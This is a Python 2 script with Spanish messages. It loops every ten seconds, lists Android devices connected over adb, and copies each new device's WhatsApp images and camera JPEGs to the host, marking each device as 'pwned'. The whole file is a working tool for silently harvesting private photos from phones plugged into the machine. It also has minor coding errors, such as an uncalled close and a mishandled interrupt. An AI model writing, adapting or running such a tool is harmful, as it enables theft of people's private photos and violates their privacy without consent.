#!/usr/bin/python

import os
import fileinput
import time
import datetime
from array import *

flag = 1
devicesPwned = []
alertedPwned = []
archivos = []

carpetas = ["/storage/sdcard0/WhatsApp/Media/WhatsApp\ Images/","/sdcard/DCIM/Camera/","/sdcard/DCIM/Camara/","/storage/external_SD/DCIM/","/storage/external_SD/WhatsApp/Media/WhatsApp\ Images/"]



def pwning():
	deviceID = []
	os.system("adb devices > devices.txt")
	file_ = open('devices.txt', 'r')

	i = 0
	for line in file_:
		if not "List of devices attached" in line:
			if not (line == "\n"):
				ID = line[0:line.find("device")-1]
				deviceID.append(ID)
				#deviceID.append(line[:15])
				#print "Dispositivo: "+deviceID[i-1]
		i = i + 1
	file_.close

	#i = 0
	for device in deviceID:
		#print (os.path.exists("/root/Desktop/"+device))
		if not ((os.path.exists("/root/Desktop/"+device) == True)):
			try:
				os.system("mkdir "+device)
				#print "Se ha creado la carpeta "+device
				for carpeta in carpetas:
						if "WhatsApp" in carpeta:
							os.system("adb pull "+carpeta+" /root/Desktop/"+device)
						else:
							archivos = []
							os.system("adb shell "+"ls "+carpeta+" > nombres.txt")
							#print "Ejecutando: "+"adb shell "+"ls > "+carpeta+" nombres.txt"
							file1 = open('nombres.txt', 'r')
							
							for line in file1:
								#print "linea"+line
							
								if not "No such file or directory" in line: 
									archivos.append(line)
									
							for archivo in archivos:
								#print "archivo"+archivo.strip()
								if ".jpg" in archivo:
									#print "Ejecutando: "+"adb pull "+carpeta+archivo+" "+device
									try:
										#print device
										#print "Ejecutando: "+"adb pull "+carpeta+archivo.strip()+" /root/Desktop/"+device
										os.system("adb pull "+carpeta+archivo.strip()+" /root/Desktop/"+device)
									except:
										print("Fallo al descargar del archivo")
			except:
				print("Fallo al crear la carpeta")
				raise

			devicesPwned.append(deviceID[i-1])
			#file_ = open('devicesPwned.txt', 'w')
		else:
			if not (device in alertedPwned):
				print "El dispositivo "+device+" ya fue pwneado"
				alertedPwned.append(device)
		i = i + 1
	#os.system("rm devices.txt")
	

if __name__ == "__main__" :
	while (flag):
		try:
			pwning()
			print datetime.datetime.now().strftime("%H:%M:%S")+": Esperando 10 segundos para volver a empezar"
			time.sleep(10)
		except:
			KeyboardInterrupt
